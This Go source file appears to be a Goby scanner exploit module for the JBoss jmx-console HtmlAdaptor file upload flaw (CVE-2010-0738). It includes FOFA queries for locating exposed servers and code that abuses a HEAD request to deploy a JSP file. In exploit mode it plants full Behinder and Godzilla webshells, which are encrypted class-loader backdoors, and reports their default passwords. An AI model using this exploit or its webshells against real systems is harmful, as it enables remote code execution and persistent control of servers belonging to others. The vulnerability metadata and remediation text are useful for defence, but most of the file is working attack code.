package exploits

import (
	"bytes"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "JBoss jmx-console/HtmlAdaptor file upload vulnerability (CVE-2010-0738)",
    "Description": "<p>Red Hat JBoss Enterprise Application Platform (EAP) is an open-source, J2EE based middleware platform developed by Red Hat in the United States. This platform is mainly used for building, deploying, and hosting Java applications and services. Jboss Application Server is one of the open-source application servers based on Java EE.</p><p>The JMX Console web application in JBossAs in Red Hat Jboss before 4.2.0.CP09 and before 4.3.4. CP3, version 0.08, only performs access control on the GET and POST methods, which allows remote attackers to send requests to this application's GET handler using different methods. Furthermore, constructing file uploads can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.</p>",
    "Product": "JBoss-EAP",
    "Homepage": "https://www.jboss.org/",
    "DisclosureDate": "2010-05-26",
    "PostTime": "2024-01-09",
    "Author": "zou",
    "FofaQuery": "body=\"<h3>Your JBoss Enterprise Application Platform is running.</h3>\" || title==\"EAP 6\" || body=\"href=\\\"eap.css\" || title=\"JBoss EAP\" || body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss\" || banner=\"JBoss\" || banner=\"JBoss\"",
    "GobyQuery": "body=\"<h3>Your JBoss Enterprise Application Platform is running.</h3>\" || title==\"EAP 6\" || body=\"href=\\\"eap.css\" || title=\"JBoss EAP\" || body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss\" || banner=\"JBoss\" || banner=\"JBoss\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.</p>",
    "Recommendation": "<p>1. The manufacturer has released patches and repair plans. Please update them promptly: <a href=\"https://jbossas.jboss.org/downloads/\">https://jbossas.jboss.org/downloads/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "rewrwer.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2010-0738"
    ],
    "CNNVD": [
        "CNNVD-201005-424"
    ],
    "CNVD": [
        "CNVD-2010-0786"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "JBoss jmx-console/HtmlAdaptor 文件上传漏洞（CVE-2010-0738）",
            "Product": "RedHat-JBoss-EAP",
            "Description": "<p>Red Hat JBoss Enterprise Application Platform（EAP）是美国红帽（Red Hat）公司的一套开源、基于J2EE的中间件平台。该平台主要用于构建、部署和托管Java应用程序与服务。Jboss Application Server 是其中的一款基于JavaEE的开源的应用服务器。</p><p>Red Hat Jboss&nbsp;4.2.0.CP09 之前版本和 4.3.4.CP3 之前版本 0.08 中的 JBossAs 中的 JMX-Console Web 应用程序仅对 GET 和 POST 方法执行访问控制，这允许远程攻击者使用不同的方法向此应用程序的 GET 处理程序发送请求。进而构造文件上传，可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "Recommendation": "<p>1、厂商已发布补丁和修复方案，请及时更新：<a href=\"https://jbossas.jboss.org/downloads/\">https://jbossas.jboss.org/downloads/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "JBoss jmx-console/HtmlAdaptor file upload vulnerability (CVE-2010-0738)",
            "Product": "JBoss-EAP",
            "Description": "<p>Red Hat JBoss Enterprise Application Platform (EAP) is an open-source, J2EE based middleware platform developed by Red Hat in the United States. This platform is mainly used for building, deploying, and hosting Java applications and services. Jboss Application Server is one of the open-source application servers based on Java EE.</p><p>The JMX Console web application in JBossAs in Red Hat Jboss before 4.2.0.CP09 and before 4.3.4. CP3, version 0.08, only performs access control on the GET and POST methods, which allows remote attackers to send requests to this application's GET handler using different methods. Furthermore, constructing file uploads can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.</p>",
            "Recommendation": "<p>1. The manufacturer has released patches and repair plans. Please update them promptly: <a href=\"https://jbossas.jboss.org/downloads/\">https://jbossas.jboss.org/downloads/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10905"
}`

	randomString321adas := func(size int) string {
		alpha := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		var buffer bytes.Buffer
		for i := 0; i < size; i++ {
			buffer.WriteByte(alpha[rand.Intn(len(alpha))])
		}
		return buffer.String()
	}

	uploadFileRequest5try56y6 := func(hostInfo *httpclient.FixUrl, filename string, payload string) (*httpclient.HttpResponse, error) {
		appName := randomString321adas(5)
		filename = strings.ReplaceAll(filename, `.jsp`, ``)
		uploadRequestConfig := httpclient.NewRequestConfig("HEAD", "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=5&arg0="+appName+".war&arg1="+filename+"&arg2=.jsp&arg3="+url.QueryEscape(payload)+"&arg4=True")
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.VerifyTls = false
		resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
			checkRequestConfig := httpclient.NewGetRequestConfig("/" + appName + "/" + filename + ".jsp")
			checkRequestConfig.VerifyTls = false
			checkRequestConfig.FollowRedirect = false
			for i := 0; i < 5; i++ {
				if resp, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					return resp, nil
				} else if err != nil {
					return nil, err
				}
				time.Sleep(2 * time.Second)
			}
			return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
		} else {
			return nil, errors.New("漏洞利用失败")
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			filename := randomString321adas(5)
			checkStr := goutils.RandomHexString(10)
			resp, _ := uploadFileRequest5try56y6(hostInfo, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			var content string
			filename := randomString321adas(5)
			if attackType == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = "<%@page import=\"java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*\" %><%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName(\"sun.misc.BASE64Decoder\");  Object decoder = base64.newInstance();  value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%><% if(request.getMethod().equals(\"POST\")){String k = \"e45e329feb5d925b\";session.putValue(\"u\", k);Cipher c = Cipher.getInstance(\"AES\");c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);}%>"
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = "<%! String xc = \"3c6e0b8a9c15224a\";String pass = \"pass\";String md5 = md5(pass + xc);static Class payloadClass;class X extends ClassLoader {public X(ClassLoader z) {super(z);}public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));return c.doFinal(s);} catch (Exception e) {return null;}}public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret;}public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64 = Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});} catch (Exception e) {try {base64 = Class.forName(\"sun.misc.BASE64Encoder\");Object Encoder = base64.newInstance();value = (String) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});} catch (Exception e2) {}}return value;}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try {base64 = Class.forName(\"sun.misc.BASE64Decoder\");Object decoder = base64.newInstance();value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e2) {}}return value;}%><%try {byte[] data = base64Decode(request.getParameter(pass));data = x(data, false);if (payloadClass == null) {payloadClass = new X(this.getClass().getClassLoader()).Q(data);} else {java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();Object f = payloadClass.newInstance();f.equals(arrOut);f.equals(pageContext);f.equals(data);response.getWriter().write(md5.substring(0, 16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));}} catch (Exception e) {}%>"
			} else if attackType == "custom" {
				filename = goutils.B2S(stepLogs.Params["filename"])
				content = goutils.B2S(stepLogs.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFileRequest5try56y6(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
